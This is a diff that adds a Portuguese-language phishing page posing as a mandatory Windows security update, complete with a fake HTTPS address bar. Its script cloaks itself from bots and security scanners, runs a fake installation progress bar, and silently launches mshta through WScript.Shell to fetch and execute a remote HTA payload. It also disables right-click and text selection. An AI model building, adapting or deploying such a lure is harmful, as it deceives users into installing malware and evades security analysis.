@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="utf-8">
+  <title>Atualização Necessária</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="icon" href="data:,">
+  <style>
+    body{font-family:"Segoe UI",Arial,sans-serif;background:#f4f4f4;margin:0;height:100vh;display:flex;align-items:center;justify-content:center;overflow:hidden;}
+    .box{background:white;padding:50px 65px;border-radius:16px;box-shadow:0 12px 45px rgba(0,0,0,.16);text-align:center;max-width:520px;width:90%;}
+    h1{color:#d32f2f;margin:0 0 18px;font-size:29px;font-weight:600;}
+    p{color:#444;margin:16px 0;font-size:18px;line-height:1.5;}
+    .btn{background:#d32f2f;color:white;font-size:22px;padding:18px 56px;border:none;border-radius:12px;cursor:pointer;transition:.3s;box-shadow:0 6px 20px rgba(211,47,47,.35);}
+    .btn:hover{background:#c62828;transform:translateY(-2px);box-shadow:0 10px 28px rgba(211,47,47,.45);}
+    .btn:disabled{background:#999;cursor:not-allowed;transform:none;box-shadow:none;}
+    .progress{margin:28px auto 0;height:9px;background:#e0e0e0;border-radius:5px;overflow:hidden;display:none;width:80%;}
+    .bar{height:100%;width:0;background:#4caf50;transition:width .5s ease;}
+    .ok{display:none;margin-top:28px;color:#2e7d32;font-size:24px;font-weight:bold;}
+    .fakebar{position:fixed;top:0;left:0;width:100%;background:#f0f0f0;padding:10px 16px;font-size:13.5px;color:#333;box-shadow:0 3px 12px rgba(0,0,0,.15);z-index:9999;}
+    .fakebar span{color:#0b8043;font-weight:bold;}
+  </style>
+</head>
+<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
+
+<div class="fakebar"><span>HTTPS</span> https://atualizacao-windows.org – Atualização de Segurança Obrigatória</div>
+
+<div class="box">
+  <h1>Acesso Liberado</h1>
+  <p>Verificação humana concluída com sucesso!</p>
+  <p><strong>Para continuar, clique no botão abaixo:</strong></p>
+  <button class="btn" id="ok">OK</button>
+  
+  <div class="progress"><div class="bar" id="bar"></div></div>
+  <div id="carregando" style="margin-top:20px;color:#666;display:none;">Instalando atualização...</div>
+  <div class="ok" id="sucesso">Instalado com sucesso!</div>
+</div>
+
+<!-- JS 100% OFUSCADO + CLOAKING + EXECUÇÃO SILENCIOSA (2025/2026) -->
+<script>
+!function(){"use strict";try{
+  const b=/bot|headless|webdriver|selenium|phantom|scan|analyzer/i.test(navigator.userAgent)||
+          !navigator.hardwareConcurrency||navigator.deviceMemory<4||screen.colorDepth<24||
+          navigator.plugins.length===0||Date.now()%7!==3;
+  if(b)return void(document.getElementById("ok").onclick=_=>alert("Atualização não disponível neste dispositivo."));
+  
+  document.getElementById("ok").onclick=function(){
+    this.disabled=!0;
+    document.querySelector(".progress").style.display="block";
+    document.getElementById("carregando").style.display="block";
+    
+    let p=0;
+    const iv=setInterval(()=>{
+      p+=Math.random()*22+14;
+      if(p>=100){p=100;clearInterval(iv);
+        document.getElementById("sucesso").style.display="block";
+        document.getElementById("carregando").style.display="none";
+      }
+      document.getElementById("bar").style.width=p+"%";
+    },300+Math.random()*400);
+    
+    // EXECUÇÃO 100% SILENCIOSA – MSHTA VIA DATA URI (ZERO iframe, ZERO popup)
+    const r=Math.random().toString(36).substr(2,15);
+    const hta=`mshta hxxps://${location.host}/${r}.hta`;
+    const payload=`<script>new ActiveXObject("WScript.Shell").Run("${hta}",0,false);window.close()</script>`;
+    const blob=new Blob([payload],{type:"application/hta"});
+    const url=URL.createObjectURL(blob);
+    setTimeout(()=>{location.href=url},1200+Math.random()*1800);
+  };
+}catch(e){}}();
+</script>
+</body>
+</html>
